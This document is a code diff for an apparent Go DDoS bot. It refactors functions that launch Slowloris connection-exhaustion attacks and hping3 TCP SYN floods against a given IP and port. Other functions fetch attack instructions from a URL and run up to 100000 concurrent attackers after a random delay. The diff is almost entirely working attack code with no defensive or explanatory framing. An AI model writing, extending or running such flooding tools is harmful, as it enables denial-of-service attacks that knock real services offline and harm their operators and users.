@@ -10,7 +10,7 @@ import (
 
 	//"strings"
 	"net"
-	"os"
+	//"os"
 	"sync"
 	"time"
 
@@ -80,7 +80,7 @@ func cronAttackDDoS(ip string, port string, date string, dateNs int64) {
 }
 
 func attackDDoS(ip string, port string) {
-	x := randomNumberChoice()
+	x := randomNumber(2)
 	fmt.Println(x)
 
 	//_, err := exec.Command("/bin/ping", "-c1", ip).Output()
@@ -93,27 +93,11 @@ func attackDDoS(ip string, port string) {
 	case 1:
 		fmt.Println("------------------------Starting Slowloris Attack------------------------")
 		slowloris(ip + ":" + port)
-		/*out, err := exec.Command("./slowloris", ip).Output()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println(string(out))*/
 	case 2:
-		fmt.Println("------------------------Starting TCP SYN Attack------------------------")
-		out, err := exec.Command("hping3", "--syn", ip, "-p", "9999", "--flood").Output()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println(string(out))
+		fmt.Println("------------------------Starting hping3 flooding Attack------------------------")	
+		hping3(ip, port)
 	}
 
-}
-
-func randomNumberChoice() int {
-	rand.Seed(time.Now().UnixNano())
-	min := 1
-	max := 2
-	return rand.Intn(max-min+1) + min
 }
 
 func getAttackInfo(url string, target interface{}) error {
@@ -126,7 +110,6 @@ func getAttackInfo(url string, target interface{}) error {
 	return json.NewDecoder(resp.Body).Decode(target)
 }
 
-//-------------
 func slowloris(url string) {
 	conn, err := net.DialTimeout("tcp", url, 2*time.Second)
 	if err != nil {
@@ -146,10 +129,9 @@ func slowloris(url string) {
 	}
 }
 
-func ddosmain() {
+func ddosmain(url string) {
 	attackers := 100000
-	url := os.Args[1]
-	x := randomNumber()
+	x := randomNumber(15)
 	fmt.Print("Waiting: ", x)
 	time.Sleep(time.Duration(x) * time.Second)
 	for {
@@ -161,9 +143,15 @@ func ddosmain() {
 	}
 }
 
-func randomNumber() int {
+func hping3(ip string, port string) {
+	_, err := exec.Command("hping3", "--syn", ip, "-p", port, "--flood").Output()
+	if err != nil {
+		log.Fatal(err)
+	}
+}
+
+func randomNumber(max int) int {
 	rand.Seed(time.Now().UnixNano())
 	min := 1
-	max := 15
 	return rand.Intn(max-min+1) + min
 }
